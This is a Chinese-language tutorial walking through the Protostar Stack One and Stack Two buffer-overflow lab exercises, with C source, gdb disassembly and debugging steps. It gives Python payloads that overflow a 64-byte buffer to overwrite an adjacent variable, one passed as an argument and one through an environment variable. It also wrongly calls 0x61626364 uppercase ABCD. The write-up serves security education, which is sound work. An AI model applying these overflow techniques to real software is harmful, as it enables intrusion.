![在这里插入图片描述](https://img-blog.csdnimg.cn/539a93327f0943689944f3cc4070cdc9.png)
# 前言
Protostar靶场的安装和一些二进制安全的基础介绍在前文已经介绍过了，这里是文章链接
~~~
https://blog.csdn.net/qq_45894840/article/details/129490504?spm=1001.2014.3001.5501
~~~
# 什么是缓冲区溢出

当系统向缓冲区写入的数据多于它可以容纳的数据时，就会发生缓冲区溢出或缓冲区溢出，用更简单的话说就是在程序运行时，系统会为程序在内存里生成一个固定空间，如果超过了这个空间，就会造成缓冲区溢出，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，甚至可以取得系统特权，进而进行各种非法操作

# 什么是寄存器
寄存器是内存中非常靠近cpu的区域，因此可以快速访问它们，但是在这些寄存器里面能存储的东西非常有限

计算机寄存器是位于CPU内部的一组用于存储和处理数据的高速存储器。用于存放指令、数据和运算结果

常见的寄存器名称以及作用：
~~~
累加器寄存器（Accumulator Register，EAX）：用于存储操作数和运算结果，在算术和逻辑操作中经常使用。

基址指针寄存器（Base Pointer Register，EBP）：用于指向堆栈帧的基地址，通常用于函数调用和局部变量访问。

堆栈指针寄存器（Stack Pointer Register，ESP）：指向当前活动堆栈的栈顶地址，在函数调用和参数传递中经常使用。

数据寄存器（Data Register，EDX、ECX、EBX）：用于存储数据，在算术和逻辑操作中经常使用。

指令指针寄存器（Instruction Pointer Register，EIP）：存储当前要执行的指令的内存地址，用于指示下一条要执行的指令。
~~~
# Stack One
## 程序静态分析
~~~
https://exploit.education/protostar/stack-one/
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/e12da44545f04f9592c72c0cd3c68a59.png)

~~~
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
~~~
### 源代码分析
首先程序定义了两个函数变量
~~~
volatile int modified;
char buffer[64];
~~~
整数型变量 modified 和字符型变量buffer，其中字符型变量buffer的字符存储最大为64个字节

然后程序检测了我们输入的参数
~~~
if(argc == 1) {
    errx(1, "please specify an argument\n");
}
~~~
如果我们只运行程序，不输入参数就会输出please specify an argument并结束程序

之后程序定义了一个变量和进行了一个字符串复制操作
~~~
modified = 0;
strcpy(buffer, argv[1]);
~~~
modified变量为0，然后将我们输入的参数复制到buffer变量里

然后程序做了一个简单的if判断
~~~
if(modified == 0x61626364) {
    printf("you have correctly got the variable to the right value\n");
} else {
    printf("Try again, you got 0x%08x\n", modified);
~~~
如果modified变量等于0x61626364就输出you have correctly got the variable to the right value，代表着我们破解成功
0x61626364是十六进制，转换字符串是大写的ABCD
![在这里插入图片描述](https://img-blog.csdnimg.cn/2bb294a5705141d2998d39bfa6d4803e.png)

也就是说，我们使modified变量变成ABCD就成功了，但是modified变量设置为0，这里我们就需要栈溢出覆盖变量原本设置的值
### 汇编分析
使用gdb打开程序，输入指令查看汇编代码
~~~
set disassembly-flavor intel
disassemble main
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/b637b91d9d24463cbeebef8bfae230bc.png)

~~~
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave
0x080484d6 <main+114>:  ret
~~~
程序最关键的地方在这里
~~~
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
~~~
它使用mov指令将esp+0x5c栈内地址的值移动到eax寄存器里，然后用cmp指令将eax寄存器里的值与0x61626364做对比，如果对比的值不一样就执行jne指令跳转到0x80484c0地址继续执行其他指令

## 程序动态分析
我们先在程序执行对比指令的地址下一个断点
~~~
b *0x080484ab
~~~
然后设置一下自动运行我们设置的命令
~~~
define hook-stop
info registers   //显示寄存器里的地址
x/24wx $esp      //显示esp寄存器里的内容
x/2i $eip        //显示eip寄存器里的内容
end              //结束
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/1933a14d251f465da752b5a1ce944078.png)

然后执行程序，并指定参数
~~~
r AAAAAAAA
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/dc619392b05c47c885d2dfe85b6c2516.png)

程序执行到我们设置的断点处自动执行了我们上面设置的命令，在这里可以看到我们输入的8个大写A在栈中的位置，并且eax寄存器里的值为0

之前说过，程序将esp+0x5c地址处的值移动到了eax寄存器里，然后执行对比指令

![在这里插入图片描述](https://img-blog.csdnimg.cn/288594083b24402086aae9b1cd4f4a6f.png)

我们查看esp+0x5c地址存放的值
~~~
x/wx $esp+0x5c
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/753f28c1e04a4ec4bda6dfbee7c8f459.png)

esp+0x5c地址就是栈里的0xbffff78c，每一段存放四个字符，c代表的是12

![在这里插入图片描述](https://img-blog.csdnimg.cn/5374480b972f42d69e2eecc3b24165e1.png)

从存放我们输入的值的栈地址到esp+0x5c，中间共有64个字符，也就是说，我们需要输出64个字符+4个我们指定的字符才能覆盖modified变量

![在这里插入图片描述](https://img-blog.csdnimg.cn/42a79d7a2fc1402396c17ae1bb40319e.png)


在这里还有一个知识点是在x86架构里，读取是由低到高的，要使modified变量变成0x61626364，不能直接输入abcd，而是dcba

~~~
 python -c "print('A'*(4*16)+'dcba')"
~~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/c4ec90f08305424295ea6e9673aba6ef.png)

成功破解了程序

# Stack Two
## 程序静态分析
~~~
https://exploit.education/protostar/stack-two/
~~~

![在这里插入图片描述](https://img-blog.csdnimg.cn/82848c1230be447ca4620158c6c6b3e5.png)
程序源代码：
~~~
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
~~~
这个程序代码和第一个差不多，只不过是将我们的输入变成了读取环境变量里的GREENIE变量内容
# 什么是环境变量


任何计算机编程语言的两个基本组成部分，变量和常量。就像数学方程式中的自变量一样。变量和常量都代表唯一的内存位置，其中包含程序在其计算中使用的数据。两者的区别在于，变量在执行过程中可能会发生变化，而常量不能重新赋值

这里只举几个常见的环境变量
# $PATH
包含了一些目录列表，作用是终端会在这些目录中搜索要执行的程序
查看$PATH环境变量
```
echo $PATH
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2dbe298e262444b0ab238c6b645259d6.png)

假如我要执行whoami程序，那么终端会在这个环境变量里搜索名为whoami程序

搜索的目录如下
```
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
/usr/local/games
/usr/games
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/37b867aaa8ed48f593bebc35ec89229b.png)

而whoami程序在/usr/bin目录下，终端会执行这个目录下的whoami程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/0abd0a154bc94c8b8ce588a9ab70195a.png)

而windows的PATH环境变量在这可以看到

![在这里插入图片描述](https://img-blog.csdnimg.cn/c6cb510cb52241e8b3a8881fdfca5b5e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/fed50f07a53341d6bfd0687cd81e3d19.png)

# $HOME
包含了当前用户的主目录

```
echo $HOME
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0d5844b513da4a0d893278415a02c29c.png)
# $PWD
包含了当前用户目前所在的目录位置

![在这里插入图片描述](https://img-blog.csdnimg.cn/fdb7ecf67bcf49b993596d9be27c84c2.png)

关于环境变量的更多信息：

```
https://en.wikipedia.org/wiki/Environment_variable
```
# 破解程序
回到正题
~~~
variable = getenv("GREENIE");
strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
~~~
首先获取了一个名为GREENIE的环境变量，然后将内容赋予variable变量，之后if判断modified是否等于0x0d0a0d0a，这个和第一个程序一模一样，只不过我们不是通过输入来破解程序，而是将payload放到指定的环境变量里，然后程序读取环境变量

~~~
export GREENIE=$(python -c "print 'A'*(4*16)+'\x0a\x0d\x0a\x0d'"); ./stack2
~~~

直接运行就能成功破解了

![在这里插入图片描述](https://img-blog.csdnimg.cn/ae4c4a865c98439392e54e8f1e36e75d.png)

